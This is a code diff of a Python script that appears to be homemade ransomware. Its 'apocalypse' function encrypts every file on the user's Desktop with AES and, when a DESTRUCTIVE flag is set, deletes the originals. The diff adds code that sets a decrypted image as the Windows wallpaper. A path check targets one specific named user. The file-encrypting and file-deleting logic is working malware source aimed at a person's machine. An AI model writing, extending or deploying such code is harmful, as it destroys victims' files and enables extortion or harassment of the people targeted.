@@ -1,5 +1,5 @@
 import os
-
+import ctypes
 import cr
 
 # encryption/decryption buffer size - 64K
@@ -10,6 +10,11 @@ userPath = os.path.expanduser("~")
 path = userPath + '\\Desktop'
 
 def apocalypse():
+    print("DECRYPTING...")
+    cr.decryptFile(os.path.abspath("cra.aes"), os.getcwd()+"\\arabes.png", cr.password, BUFFERSIZE)
+    print("CHANGING BACKGROUND...")
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("arabes.png") , 0)
+    print("BACKGROUND CHANGED SUCCESSFULLY")
     if DECRYPT:
         print("DECRYPTING...")
     else:
@@ -31,6 +36,7 @@ def apocalypse():
                 cr.encryptFile(path+"\\"+objet, path+"\\"+objet+".aes", cr.password, BUFFERSIZE)
                 if DESTRUCTIVE:
                     os.remove(path+"\\"+objet)
+    print("FILES CRYPTED SUCCESSFULLY")
 
 # detecteur de tibo
 if userPath == 'C:\\Users\\Valérie de Brémand':
